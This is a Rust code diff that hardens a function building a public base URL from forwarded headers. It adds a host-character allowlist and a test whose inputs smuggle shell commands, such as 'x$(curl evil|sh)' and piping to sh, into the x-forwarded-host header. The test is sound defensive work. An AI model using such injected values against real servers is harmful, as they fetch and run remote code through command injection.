@@ -107,11 +107,19 @@ pub fn inferred_public_base_url(headers: &HeaderMap) -> Option<String> {
     if proto != "http" && proto != "https" {
         return None;
     }
-    if host.contains('/') || host.contains('\\') || host.trim().is_empty() {
+    let host = host.trim().trim_end_matches('/');
+    if !is_safe_inferred_host(host) {
         return None;
     }
 
-    Some(format!("{proto}://{}", host.trim().trim_end_matches('/')))
+    Some(format!("{proto}://{host}"))
+}
+
+fn is_safe_inferred_host(host: &str) -> bool {
+    !host.is_empty()
+        && host
+            .chars()
+            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | ':' | '[' | ']'))
 }
 
 fn install_origin(configured_origin: Option<&str>, headers: &HeaderMap) -> Option<String> {
@@ -201,6 +209,23 @@ mod tests {
         headers.insert("x-forwarded-host", "dev.moligate.com".parse().unwrap());
 
         assert_eq!(inferred_public_base_url(&headers), None);
+    }
+
+    #[test]
+    fn rejects_shell_metacharacters_in_inferred_host() {
+        for host in [
+            "x$(curl evil|sh)",
+            "x`curl evil|sh`",
+            "dev.moligate.com;curl evil",
+            "dev.moligate.com curl.evil",
+            "dev.moligate.com|sh",
+        ] {
+            let mut headers = HeaderMap::new();
+            headers.insert("x-forwarded-proto", "https".parse().unwrap());
+            headers.insert("x-forwarded-host", host.parse().unwrap());
+
+            assert_eq!(inferred_public_base_url(&headers), None, "{host}");
+        }
     }
 
     #[test]
